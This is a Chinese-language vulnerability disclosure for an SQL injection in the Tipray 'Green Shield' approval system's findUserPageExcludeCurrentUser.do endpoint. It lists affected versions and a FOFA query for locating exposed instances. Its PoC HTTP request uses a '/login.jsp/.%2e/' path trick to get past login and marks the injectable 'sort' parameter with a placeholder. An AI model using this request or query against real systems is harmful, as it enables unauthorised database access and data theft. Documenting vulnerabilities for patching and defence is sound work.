## 天锐绿盾审批系统-findUserPageExcludeCurrentUser.do-SQL注入漏洞

## 一、漏洞简介
天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，旨在为企业提供从文件创建、流转到归档的全生命周期安全管控，并常作为OA系统中的加密软件，实现审批流程的自动化和信息化。

天锐绿盾审批系统的 findUserPageExcludeCurrentUser.do 接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL查询参数，直接操控数据库查询语句，从而绕过身份验证，获取未授权的数据、修改数据库内容或执行其他恶意操作。该漏洞可能导致敏感信息泄露，例如用户数据或系统配置信息，严重影响系统的数据完整性和机密性，进而降低整体系统安全性。

## 二、影响版本
可通过访问 /trwfe/exports/config.ini 获取版本信息
V3.53.240913

V7.05.240904

## fofa
```
app="TIPPAY-绿盾审批系统"
```

## poc
```
POST /trwfe/login.jsp/.%2e/user/findUserPageExcludeCurrentUser.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded

deptId=1&sort=a.ID_SQLI_POC
```
